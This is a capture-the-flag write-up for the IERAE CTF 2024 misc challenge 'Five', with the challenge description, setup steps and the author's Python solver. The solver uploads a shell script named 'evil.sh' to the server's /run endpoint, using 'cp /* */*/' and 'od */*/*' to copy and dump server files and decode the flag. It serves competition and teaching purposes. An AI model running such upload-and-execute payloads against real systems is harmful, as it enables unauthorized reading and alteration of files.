---
title: "Five - IERAE CTF 2024"
category: "misc"
type: "writeup"
tags: ["arkark-my-ctf-challenges", "author-solution", "challenge-source", "five", "misc", "ierae-ctf-2024"]
summary: "You can only use five different characters in JavaScript :)"
source:
  name: "arkark/my-ctf-challenges"
  url: "https://github.com/arkark/my-ctf-challenges/tree/325bbde6aaf1b2b2d07f3ddedf734094af81ec94/challenges/202409_IERAE_CTF_2024/misc/five"
license: "none stated"
ctf:
  name: "IERAE CTF 2024"
  year: 2024
  challenge: "Five"
---

## Challenge

- **Author:** [arkark](https://github.com/arkark)
- **Source:** <https://github.com/arkark/my-ctf-challenges/tree/325bbde6aaf1b2b2d07f3ddedf734094af81ec94/challenges/202409_IERAE_CTF_2024/misc/five>
- **CTF:** IERAE CTF 2024

---

# [misc] 5

## Description

You can only use five different characters in JavaScript :)

- Challenge: `http://{chall.host}:{chall.port}`

(:warning: This challenge uses an instance spawner.)

## Attachments

- [five](distfiles/five)

## Usage

Launch a challenge server:

```
cd challenge
docker compose up
```


## Solver: `solve.py`

<https://github.com/arkark/my-ctf-challenges/blob/325bbde6aaf1b2b2d07f3ddedf734094af81ec94/challenges/202409_IERAE_CTF_2024/misc/five/solution/solve.py>

```python
import httpx
import os

BASE_URL = os.getenv("HOST", "http://localhost:3000")

client = httpx.Client(base_url=BASE_URL)

res = client.post(
    "/run",
    files={
        "file": (
            "evil.sh",
            b"cp /* */*/",
        ),
    },
)
assert res.text == "Error"

res = client.post(
    "/run",
    files={
        "file": (
            "evil.sh",
            b"od */*/*",
        ),
    },
)

flag = b""
for line in res.text[len("Result: ") :].splitlines():
    for part in line.strip()[8:].split(" "):
        if not part:
            continue
        flag += int(part, base=8).to_bytes(2, "little")
print(flag.decode())
```
